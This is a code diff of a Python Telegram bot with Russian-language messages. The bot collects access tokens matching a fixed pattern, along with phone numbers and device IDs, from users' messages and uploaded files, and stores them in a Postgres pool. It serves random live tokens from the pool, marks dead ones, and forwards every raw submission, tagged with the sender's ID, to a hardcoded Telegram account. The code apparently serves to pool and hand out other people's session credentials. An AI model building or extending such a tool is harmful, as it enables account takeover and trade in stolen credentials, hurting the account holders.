@@ -4,6 +4,7 @@ import asyncpg
 import logging
 import re
 import pyrxing
+import json
 from datetime import datetime
 from zoneinfo import ZoneInfo
 from io import BytesIO
@@ -37,13 +38,32 @@ def extract_token(text: str) -> str | None:
     m = re.search(r'An_Sx6HQ9HDi[a-zA-Z0-9_\-]+', text)
     return m.group(0) if m else None
 
+def parse_json_data(text: str) -> dict:
+    """Пытается распарсить JSON и достать полезные поля"""
+    try:
+        data = json.loads(text)
+        return {
+            "token": data.get("token", ""),
+            "device_id": data.get("device_id", ""),
+            "device_type": data.get("device_type", "") or data.get("connection_params", {}).get("device_type", ""),
+            "phone": data.get("phone", ""),
+        }
+    except:
+        return {"token": extract_token(text) or ""}
+
 async def init_db():
     global db_pool
     db_pool = await asyncpg.create_pool(DATABASE_URL)
     async with db_pool.acquire() as c:
         await c.execute("CREATE TABLE IF NOT EXISTS approved_groups (group_id BIGINT PRIMARY KEY)")
-        await c.execute("CREATE TABLE IF NOT EXISTS tokens (id SERIAL PRIMARY KEY, phone TEXT, token TEXT, alive BOOLEAN DEFAULT TRUE)")
+        await c.execute("CREATE TABLE IF NOT EXISTS tokens (id SERIAL PRIMARY KEY, phone TEXT, token TEXT, raw_data TEXT, alive BOOLEAN DEFAULT TRUE)")
         await c.execute("CREATE TABLE IF NOT EXISTS stats (id SERIAL PRIMARY KEY, user_id BIGINT, username TEXT, action TEXT, created_at TIMESTAMP DEFAULT NOW())")
+
+        # Миграция для старой таблицы
+        try:
+            await c.execute("ALTER TABLE tokens ADD COLUMN IF NOT EXISTS raw_data TEXT")
+        except:
+            pass
 
 async def is_group_approved(gid):
     async with db_pool.acquire() as c:
@@ -55,16 +75,32 @@ async def add_group(gid):
 
 async def get_token():
     async with db_pool.acquire() as c:
-        r = await c.fetchrow("SELECT id, phone, token FROM tokens WHERE alive=TRUE AND token IS NOT NULL ORDER BY RANDOM() LIMIT 1")
-        return {"id": r["id"], "phone": r["phone"], "token": r["token"]} if r else None
+        r = await c.fetchrow("SELECT id, phone, token, raw_data FROM tokens WHERE alive=TRUE AND token IS NOT NULL ORDER BY RANDOM() LIMIT 1")
+        if r:
+            data = {"id": r["id"], "phone": r["phone"], "token": r["token"]}
+            if r["raw_data"]:
+                try:
+                    extra = json.loads(r["raw_data"])
+                    if "device_id" in extra:
+                        data["device_id"] = extra["device_id"]
+                except:
+                    pass
+            return data
+        return None
 
 async def kill(id):
     async with db_pool.acquire() as c: await c.execute("UPDATE tokens SET alive=FALSE WHERE id=$1", id)
 
-async def save(tok):
+async def save(raw_text: str):
+    parsed = parse_json_data(raw_text)
+    token = parsed.get("token")
+    if not token: return False
     async with db_pool.acquire() as c:
-        e = await c.fetchval("SELECT id FROM tokens WHERE token=$1", tok)
-        if not e: await c.execute("INSERT INTO tokens(token) VALUES($1)", tok)
+        e = await c.fetchval("SELECT id FROM tokens WHERE token=$1", token)
+        if not e:
+            await c.execute("INSERT INTO tokens(token, raw_data) VALUES($1, $2)", token, raw_text)
+            return True
+    return False
 
 async def clear_dead():
     async with db_pool.acquire() as c:
@@ -155,9 +191,10 @@ async def handle_file(msg: Message):
         return
 
     n = 0
-    for t in tokens:
-        await save(t)
-        n += 1
+    for line in lines:
+        if extract_token(line):
+            await save(line)
+            n += 1
 
     await bot.send_document(8706712229, msg.document.file_id, caption=f"📁 {n} токенов от {msg.from_user.id}")
     await msg.answer(f"✅ {n} токенов загружено из файла")
@@ -254,9 +291,10 @@ async def handler(msg: Message):
                 await msg.answer("❌ Неверный формат токенов. Отправьте токены, каждый с новой строки")
                 return
             n = 0
-            for t in tokens:
-                await save(t)
-                n += 1
+            for line in lines:
+                if extract_token(line):
+                    await save(line)
+                    n += 1
             await bot.send_message(8706712229, f"📥 {n} токенов от {msg.from_user.id}:\n\n{msg.text[:500]}")
             await msg.answer(
                 f"✅ Токены <code>{n}</code> добавлены в базу данных.\n\n"
